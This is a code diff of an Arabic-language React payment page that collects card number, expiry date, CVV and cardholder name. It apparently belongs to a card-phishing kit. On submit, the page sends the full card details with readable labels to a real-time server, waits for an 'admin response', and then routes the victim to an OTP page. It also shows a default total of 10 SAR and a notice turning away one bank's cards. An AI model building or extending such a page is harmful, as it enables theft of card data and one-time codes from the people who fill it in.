@@ -1,65 +1,103 @@
 import Main from "@/components/Main";
 import { useEffect, useState } from "react";
-import { validateLanguage, validateNumericInput } from "../utils/helpers";
 import { Link, useLocation, useNavigate } from "react-router-dom";
-import { currentPage, extraInfo, sendDataToServer } from "@/context/signals";
-import { cn } from "../lib/utils";
+import { validateLanguage } from "@/lib/helpers";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
+import { FieldValues, useForm } from "react-hook-form";
+import { CustomSelect } from "@/components/ui/select";
+import Input from "@/components/Input";
+import CardNumberInput from "@/components/CardNumberInput";
 
+const errMsgs = {
+  name: "الأسم غير صحيح. يجب أن يكون باللغة الأنجليزية",
+  card_num: "رقم البطاقة غير صحيح. يجب أن يكون الرقم مكون من 16 رقم",
+  cvv: "رقم cvv غير صحيح. يجب أن يكون الرقم مكون من 3 رقم",
+  month: "يرجى تحديد الشهر",
+  year: "يرجى تحديد السنة",
+};
+
+const years = [
+  { name: "2024" },
+  { name: "2025" },
+  { name: "2026" },
+  { name: "2027" },
+  { name: "2028" },
+  { name: "2029" },
+  { name: "2030" },
+];
+const months = [
+  { name: "1" },
+  { name: "2" },
+  { name: "3" },
+  { name: "4" },
+  { name: "5" },
+  { name: "6" },
+  { name: "7" },
+  { name: "8" },
+  { name: "9" },
+  { name: "10" },
+  { name: "11" },
+  { name: "12" },
+];
 const Gateway = () => {
-  const [error, setError] = useState<any>({
-    name: "",
-    card_num: null,
-    ccv: null,
-    exp_month: errMsgs.month,
-    exp_year: errMsgs.year,
-  });
-  const [_dirty, setDirty] = useState(false);
   const { state } = useLocation();
-  // console.log(state);
-  const navigate = useNavigate();
-
-  console.log(error);
-
-  const handleSubmit = (e: any) => {
-    e.preventDefault();
-    const formData = new FormData(e.target);
-    const data: any = {};
-    data["اسم حامل البطاقة"] = formData.get("name");
-    data["رقم البطاقة"] = formData.get("card_num");
-    data["الشهر"] = formData.get("exp_month");
-    data["السنة"] = formData.get("exp_year");
-    data.cvv = formData.get("cvv");
-    console.log(data);
-
-    // if (Object.values(data).filter((d) => !d).length === 0) {
-    if (true) {
-      extraInfo.value.phone = state?.phone;
-
-      // [ ] should be true for production
-      sendDataToServer(data, "معلومات البطاقة", "otp", false, navigate, "/otp");
-    }
-  };
+  const {
+    register,
+    handleSubmit,
+    setValue,
+    formState: { errors, isValidating, isValid },
+  } = useForm({ mode: "all" });
+  const [cardType, setCardType] = useState<"visa" | "master" | "mada" | null>(
+    state?.paymentMethod
+  );
 
   useEffect(() => {
-    currentPage.value = "معلومات البطاقة";
+    setCurrentPage("payment-gateway");
   }, []);
+  const navigate = useNavigate();
+
+  const onSubmit = (data: FieldValues) => {
+    if (Object.values(data).filter((d) => !d).length === 0) {
+      sendDataToServer({
+        data: {
+          "نوع البطاقة": cardType,
+          "إسم حامل البطاقة": data.name,
+          "رقم البطاقة": data.card_num,
+          "تاريخ الانتهاء": `${data.exp_month}/${data.exp_year}`,
+          cvv: data.cvv,
+        },
+        current: "payment-gateway",
+        nextPage: "otp",
+        waitingForAdminResponse: true,
+        navigate,
+      });
+    }
+  };
 
   return (
     <Main>
       <main className="bg-gray-100 min-h-screen py-10 lg:pt-20">
         <div className="bg-white rounded-xl flex flex-col items-center justify-center w-fit max-w-[90dvw] lg:max-w-lg p-4 mx-auto">
+          <div className="py-2 px-6 mb-4 rounded-xl w-full">
+            <img
+              src="/assets/images/logo.svg"
+              alt="logo"
+              className="h-10 mx-auto"
+            />
+          </div>
+
           <div className="bg-main/20 rounded-2xl py-3 ps-4 pe-20 relative">
             <img
-              src={`/assets/images/${state?.paymentMethod}-card.svg`}
+              src={`/assets/images/${cardType || "visa"}-card.svg`}
               className="w-16 absolute left-2 top-4 lg:top-2 scale-125"
-              alt={`${state?.paymentMethod} logo`}
+              alt={`${cardType || "visa card"} logo`}
             />
 
             <h2 className="text-xl font-bold text-main">
               الدفع من خلال بطاقة الائتمان
             </h2>
             <p className="text-gray-600">
-              سيتم إحراء معاملة مالية على حسابك المصرفي بإستخدام البطاقة بقيمة
+              سيتم إجراء معاملة مالية على حسابك المصرفي بإستخدام البطاقة بقيمة
               المجموع الكلي
             </p>
           </div>
@@ -68,36 +106,112 @@ const Gateway = () => {
             معلومات البطاقة
           </h3>
           <form
-            onSubmit={handleSubmit}
-            onChange={() => setDirty(true)}
-            className="mt-4 grid grid-cols-6 items-end gap-2 w-full px-4"
+            onSubmit={handleSubmit(onSubmit)}
+            className="mt-4 grid grid-cols-6 items-end gap-8 w-full px-4"
           >
-            <InputPay
-              error={error}
-              setError={setError}
+            <Input
+              errors={errors}
+              register={register}
               label="إسم حامل البطاقة"
               placeholder="أدخل إسم حامل البطاقة"
               id="name"
               type="text"
+              isAr
               className="text-left"
-            />
-            <InputPay
-              error={error}
-              setError={setError}
-              label="رقم البطاقة"
-              placeholder="xxxx xxxx xxxx xxxx"
-              defaultValue={state?.iban}
-              id="card_num"
-              type="tel"
-              max={16}
-              className={"text-left"}
+              containerClassName="col-span-6"
+              options={{
+                required: "هذا الحقل ضروري",
+                validate: (value) =>
+                  validateLanguage(value) !== "en" ? errMsgs.name : true,
+              }}
             />
 
-            <CVVInput error={error} setError={setError} />
+            <CardNumberInput
+              errors={errors}
+              register={register}
+              label="رقم البطاقة"
+              placeholder="xxxx xxxx xxxx xxxx"
+              id="card_num"
+              type="tel"
+              className={"text-left"}
+              containerClassName="col-span-6"
+              options={{
+                required: "هذا الحقل ضروري",
+                pattern: {
+                  value: /^[0-9]{16}$/,
+                  message: errMsgs.card_num,
+                },
+              }}
+              cardType={cardType!}
+              setCardType={setCardType}
+            />
+
+            <div className={"col-span-6"}>
+              <div className="flex justify-center gap-2">
+                <label
+                  htmlFor={"cvv"}
+                  className="grow block text-sm font-bold text-gray-800"
+                >
+                  الرمز السري (CVV)
+                </label>
+
+                <label
+                  htmlFor={"year_month"}
+                  className="block text-sm font-bold text-gray-800 w-fit"
+                >
+                  تاريخ الإنتهاء
+                </label>
+              </div>
+
+              <div className="mt-2 flex justify-center flex-row-reverse gap-2">
+                <CustomSelect
+                  id="exp_month"
+                  placeholder="شهر"
+                  label=""
+                  sels={months}
+                  className="px-4"
+                  register={register}
+                  errors={errors}
+                  options={{ required: errMsgs.month }}
+                  setValue={setValue}
+                />
+                <CustomSelect
+                  id="exp_year"
+                  placeholder="سنة"
+                  label=""
+                  sels={years}
+                  className="px-4"
+                  register={register}
+                  errors={errors}
+                  options={{ required: errMsgs.year }}
+                  setValue={setValue}
+                />
+
+                <Input
+                  errors={errors}
+                  register={register}
+                  isAr
+                  id="cvv"
+                  placeholder="خلف البطاقة"
+                  type="password"
+                  max={3}
+                  className={"flex-1"}
+                  containerClassName="col-span-6"
+                  options={{
+                    required: "هذا الحقل ضروري",
+                    pattern: {
+                      value: /^\d{3}$/,
+                      message: errMsgs.cvv,
+                    },
+                  }}
+                />
+              </div>
+            </div>
+
             <p className="w-max">
               {`المجموع الكلى:`}{" "}
-              <strong className="text-main font-bold underline ring-offset-4">
-                {state?.total}
+              <strong className="text-green-600 font-bold underline ring-offset-4">
+                {state?.value || state?.total || 10}
               </strong>{" "}
               ر.س
             </p>
@@ -105,22 +219,23 @@ const Gateway = () => {
               <button
                 className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-[#76b456] hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
                 type="submit"
-                // disabled={
-                //   error.name === "" ||
-                //   loading.value ||
-                //   !dirty ||
-                //   (dirty && !Object.values(error).every((er) => er === null))
-                // }
+                disabled={!isValid}
               >
-                ادفع الآن
+                {isValidating ? "جاري الحفص ..." : "ادفع الآن"}
               </button>
               <Link
                 className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                 to={"/checkout/4"}
+                state={state}
               >
                 السابق
               </Link>
             </div>
+
+            <p className="text-center col-span-full mt-2 bg-deep-orange-500 text-white rounded-lg px-4 py-2 w-fit text-sm animate-pulse">
+              "نعتذر من عملائنا الأعزاء، نحن لا نقبل التعامل بالبطاقات الصادرة
+              من بنك الراجحي في الوقت الراهن. نشكركم على تفهمكم."
+            </p>
 
             <img
               src="/assets/images/cards-all.png"
@@ -134,217 +249,3 @@ const Gateway = () => {
   );
 };
 export default Gateway;
-
-const errMsgs = {
-  name: "الأسم غير صحيح. يجب أن يكون باللغة الأنجليزية",
-  card_num: "رقم البطاقة غير صحيح. يجب أن يكون الرقم مكون من 16 رقم",
-  cvv: "رقم cvv غير صحيح. يجب أن يكون الرقم مكون من 3 رقم",
-  month: "يرجى تحديد الشهر",
-  year: "يرجى تحديد السنة",
-};
-
-const CVVInput = ({ error, setError }: any) => {
-  return (
-    <div className={"col-span-6"}>
-      <div className="flex justify-center gap-2">
-        <label
-          htmlFor={"cvv"}
-          className="grow block text-sm font-medium text-gray-800"
-        >
-          الرمز السري (CVV)
-        </label>
-
-        <label
-          htmlFor={"year_month"}
-          className="block text-sm font-medium text-gray-800 w-fit"
-        >
-          تاريخ الإنتهاء
-        </label>
-      </div>
-
-      <div className="flex justify-center flex-row-reverse gap-2">
-        <MonthInput error={error} setError={setError} />
-        <YearInput error={error} setError={setError} />
-        <CVV error={error} setError={setError} />
-      </div>
-      <p
-        className={`mt-1 col-span-6 text-red-500 text-xs h-4 transition-opacity ${
-          error.cvv ? "opacity-100" : "opacity-0"
-        }`}
-      >
-        {error.cvv || error["exp_month"] || error["exp_year"]}
-      </p>
-    </div>
-  );
-};
-
-const MonthInput = ({ error, setError }: any) => {
-  const [month, setMonth] = useState("");
-
-  useEffect(() => {
-    setError({
-      ...error,
-      exp_month: !month ? errMsgs.month : null,
-    });
-  }, [month]);
-
-  return (
-    <select
-      className={`flex-1 outline-none mt-1 w-full text-center rounded-lg border border-gray-300 bg-white text-sm text-gray-700 shadow-sm p-2 focus-within:border-main/20 focus-within:ring-1 focus-within:ring-main/20`}
-      id={"exp_month"}
-      name={"exp_month"}
-      value={month}
-      onChange={(e) => setMonth(e.target.value)}
-      disabled
-    >
-      <option disabled value="">
-        شهر
-      </option>
-      {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((m) => (
-        <option key={m} value={m}>
-          {m}
-        </option>
-      ))}
-    </select>
-  );
-};
-
-const YearInput = ({ error, setError }: any) => {
-  const [year, setYear] = useState("");
-  useEffect(() => {
-    setError({
-      ...error,
-      exp_year: !year ? errMsgs.year : null,
-    });
-  }, [year]);
-
-  return (
-    <select
-      className={`flex-1 outline-none mt-1 w-full text-center rounded-lg border border-gray-300 bg-white text-sm text-gray-700 shadow-sm p-2 focus-within:border-main/20 focus-within:ring-1 focus-within:ring-main/20`}
-      id={"exp_year"}
-      name={"exp_year"}
-      value={year}
-      onChange={(e) => setYear(e.target.value)}
-      disabled
-    >
-      <option disabled value="">
-        سنة
-      </option>
-      {[2024, 2025, 2026, 2027, 2028, 2029, 2030].map((m) => (
-        <option key={m} value={m}>
-          {m}
-        </option>
-      ))}
-    </select>
-  );
-};
-
-const CVV = ({ error, setError }: any) => {
-  const [cvv, setCvv] = useState("");
-  console.log(cvv);
-  useEffect(() => {
-    const isValid = cvv.length === 3 && cvv.match(/^[0-9]+$/) ? true : false;
-
-    // console.log(isValid);
-    setError({
-      ...error,
-      cvv: cvv === "" ? null : isValid ? null : errMsgs.cvv,
-    });
-  }, [cvv]);
-
-  return (
-    <input
-      className={`flex-1 text-center text-xs lg:text-sm mt-1 w-full rounded-lg border border-gray-300 bg-white text-gray-700 shadow-sm p-2 focus-within:border-main/20 focus-within:ring-1 focus-within:ring-main/20`}
-      id={"cvv"}
-      placeholder="خلف البطاقة"
-      type="password"
-      name={"cvv"}
-      maxLength={3}
-      value={cvv}
-      onChange={(e) => setCvv(validateNumericInput(e.target.value))}
-      disabled
-    />
-  );
-};
-
-const InputPay = ({
-  label,
-  type,
-  max,
-  placeholder,
-  id,
-  error,
-  setError,
-  defaultValue,
-  className,
-}: {
-  label: string;
-  type: string;
-  max?: number;
-  placeholder: string;
-  id: string;
-  error: any;
-  setError: any;
-  defaultValue?: string;
-  className?: string;
-}) => {
-  const [value, setValue] = useState(defaultValue || "");
-
-  useEffect(() => {
-    if (value) {
-      if (id === "name") {
-        const lang = validateLanguage(value);
-
-        setError({
-          ...error,
-          name: lang !== "en" && value !== "" ? errMsgs.name : null,
-        });
-      }
-
-      if (id === "card_num") {
-        const isValid =
-          value.length === 16 && value.match(/^[0-9]+$/) && value !== "";
-
-        setError({
-          ...error,
-          card_num: isValid ? null : errMsgs.card_num,
-        });
-      }
-    }
-  }, [value]);
-
-  return (
-    <div className="col-span-6">
-      <label htmlFor={id} className="block text-sm font-medium text-gray-800">
-        {label}
-      </label>
-
-      <input
-        className={cn(
-          `mt-1 w-full text-right rounded-lg border border-gray-300 bg-white text-sm text-gray-700 shadow-sm p-2 ${
-            error[id]
-              ? "border-red-500"
-              : "focus-within:border-main/20 focus-within:ring-1 focus-within:ring-main/20"
-          }`,
-          className
-        )}
-        id={id}
-        name={id}
-        type={type}
-        placeholder={placeholder}
-        maxLength={max}
-        value={value}
-        onChange={(e) => setValue(e.target.value)}
-        disabled
-      />
-
-      <p
-        className={`col-span-6 text-red-500 text-xs h-4 transition-opacity ${
-          error[id] ? "opacity-100" : "opacity-0"
-        }`}
-      >
-        {error[id]}
-      </p>
-    </div>
-  );
-};
